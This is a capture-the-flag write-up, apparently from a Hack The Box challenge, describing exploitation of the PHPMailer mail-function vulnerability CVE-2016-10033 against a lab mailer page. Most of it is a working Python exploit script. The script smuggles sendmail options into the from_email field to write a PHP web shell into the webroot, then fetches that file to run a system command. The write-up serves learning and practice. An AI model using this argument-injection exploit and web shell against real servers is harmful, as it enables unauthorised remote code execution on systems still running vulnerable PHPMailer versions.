# Letter Dispair

This machine was vulnerable to a [PHPMailer vulnerability - CVE-2016-10033](https://github.com/opsxcq/exploit-CVE-2016-10033). 
After reading through the soruce code once it googled for email vulnerabilities and this was the first one I found. 
A lot of things looked right at first glance, and when I saw that I could control the fifth `$additional_parameters` param sent to the `mail` 
function I decided to try and exploit it. 

The exploit was fairly straight forward. `from_email` sets the `$additional_parameters` param that we use to control where to write the log files to.
The file is written to `/var/www/html/exploit.php` which is a location that we're allowed to execute php files in. The payload then contains `<?php system('cat /flag.txt');?>`
which will be written to the php file and then parsed and executed when visiting the file. 


```python
import requests
import sys

host = "http://206.189.124.56:30753" # Host to attack
url = host + "/mailer.php" # Path tho the mail application
filename = "exploit.php"; # The name our uploaded file will get

data = {
        "from_email": "-OQueueDirectory=/tmp -X/var/www/html/" + filename, # Write logs to this dir.
        "from_name": "", # important - must be empty
        "subject": "<?php system('cat /flag.txt');?>", # Payload
        "email_body": "What ever",
        "email_list": "foo@bar.com"
}

res1 = requests.post(url,data=data, files=dict(foo='bar')) # files=dict to force multipart/form-data

if res1.status_code != 200:
    print("Explpoit failed Status Code - ", res1.status_code)
    sys.exit()

res2 = requests.get(host+"/"+filename)

flagIndex = -1
flagStopIndex = -1
if res2.status_code == 200:
    flagIndex = res2.text.find("HTB{")
    flagStopIndex = res2.text.find("}", flagIndex)

if flagIndex > -1:
    print("Found flag - ", res2.text[flagIndex:flagStopIndex+1])
    print("URL-  " + host + "/" + filename)
else:
    print("no flag")
```
